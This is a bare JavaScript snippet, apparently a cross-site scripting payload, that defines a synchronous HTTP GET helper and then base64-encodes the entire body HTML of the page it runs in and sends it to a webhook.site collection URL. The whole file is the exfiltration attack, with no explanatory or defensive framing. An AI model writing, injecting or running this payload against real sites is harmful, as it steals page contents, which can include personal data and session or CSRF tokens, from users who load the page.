function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet("https://webhook.site/4936b7f9-93a9-4c62-9239-3125cccdc0f7/?a="+btoa(document.body.innerHTML));